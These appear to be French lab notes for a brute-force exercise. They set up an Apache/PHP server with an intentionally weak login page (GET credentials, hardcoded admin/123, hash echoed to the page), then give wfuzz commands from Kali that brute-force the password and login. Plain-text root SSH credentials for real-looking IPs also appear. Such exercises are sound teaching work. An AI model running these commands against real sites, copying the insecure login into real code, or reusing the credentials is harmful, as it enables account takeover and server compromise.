@@ -1,0 +1,74 @@
+coté server :
+Server
+ssh root@45.79.211.212
+Lamp$$205909$$@@voiture_maison_toillette
+
+apt update
+
+sudo apt install apache2 libapache2-mod-php
+cd /var/www/html
+dir
+mv index.html index.html.old
+
+nano login.php
+
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion avec POST</title>
+</head>
+<body>
+    <h1>Connexion</h1>
+    <form method="get" action="">
+        <label for="login">Login :</label>
+        <input type="text" name="login" id="login" required>
+        <br><br>
+        <label for="password">Mot de passe :</label>
+        <input type="password" name="password" id="password" required>
+        <br><br>
+        <button type="submit">Se connecter</button>
+    </form>
+
+    <?php
+    if ($_SERVER["REQUEST_METHOD"] == "GET") {
+        $login = $_GET['login'];
+        $password = $_GET['password'];
+
+        // Génération du hash SHA-256
+        $hashed_password = hash('sha256', $password);
+
+        echo "<p>Hash généré pour le mot de passe saisi : <strong>$hashed_password</strong></p>";
+
+        // Mot de passe haché attendu pour "123"
+        $expected_hashed_password = hash('sha256', '123');
+
+        if ($login === 'admin' && $hashed_password === $expected_hashed_password) {
+            echo "OK";
+        } else {
+            echo "Error";
+        }
+    }
+    ?>
+</body>
+</html>
+
+sudo systemctl restart apache2
+
+coté client
+login : 45.79.211.212/login.php
+
+Lancer attaquant : kali
+Mykali :
+ssh-keygen -R 45.79.197.235
+ssh root@45.79.197.235
+Lamp$$205909$$@@voiture_maison_toillette
+
+GET : wfuzz -c -z file,passwords.txt  --hc 200 "http://45.79.211.212/login.php?login=admin&password=FUZZ&quot;
+wfuzz -c -z file,passwords.txt  --hh 607 "http://45.79.211.212/login.php?login=admin&password=FUZZ&quot;
+wfuzz -c -z file,passwords.txt  --hs "Error" "http://45.79.211.212/login.php?login=admin&password=FUZZ&quot;
+
+POST :
+wfuzz -c -z file,passwords.txt -d "login=admin&password=FUZZ" --hc 200 http://45.79.211.212/login.php
+wfuzz -c -z file,logins.txt -d "login=FUZZ&password=123" --hc 200 http://localhost/login.php
